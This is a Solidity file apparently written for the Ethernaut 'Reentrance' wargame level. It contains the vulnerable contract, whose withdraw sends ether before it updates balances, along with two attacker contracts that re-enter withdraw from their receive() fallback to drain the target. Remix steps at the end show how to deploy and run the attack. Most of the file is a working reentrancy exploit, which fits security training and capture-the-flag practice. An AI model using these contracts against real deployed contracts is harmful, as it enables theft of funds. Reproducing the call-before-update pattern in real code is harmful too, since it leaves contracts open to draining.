// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "@openzeppelin/contracts/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

contract ReentrancyAttack {
    Reentrance public reentrancy;
    uint256 public attackAmount;

    constructor(address payable _reentrancy) payable public {
        reentrancy = Reentrance(_reentrancy);
    }

    function attack() external payable {
        attackAmount = msg.value;
        reentrancy.donate{value: msg.value}(address(this));
        reentrancy.withdraw(msg.value);
    }

    receive() external payable {
        if (address(reentrancy).balance > 0) {
            reentrancy.withdraw(attackAmount);
        }
    }
}


// Using iterface

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract ReentrancyAttack2 {
    IReentrance public reentrancy;
    uint public attackAmount;

    constructor(address _target) public  payable {
        reentrancy = IReentrance(_target);
    }

    function attack() public payable {
        require(msg.value > 0, "Need ETH to attack");
        attackAmount = msg.value;
        reentrancy.donate{value: msg.value}(address(this));
        reentrancy.withdraw(msg.value);
    }

    receive() external payable {
        if (address(reentrancy).balance >= attackAmount) {
            reentrancy.withdraw(attackAmount);
        }
    }
}

/* 
using remix (Step-by-Step)
1. Compile & Deploy ReentrancyAttack:
    - Use Injected Web3
    - Pass Reentrance instance address (from Ethernaut)
    - Deploy

2. Call attack():
    - In Value field, input: 0.001
    - Set dropdown to ether
    - Click transact on attack()
*/
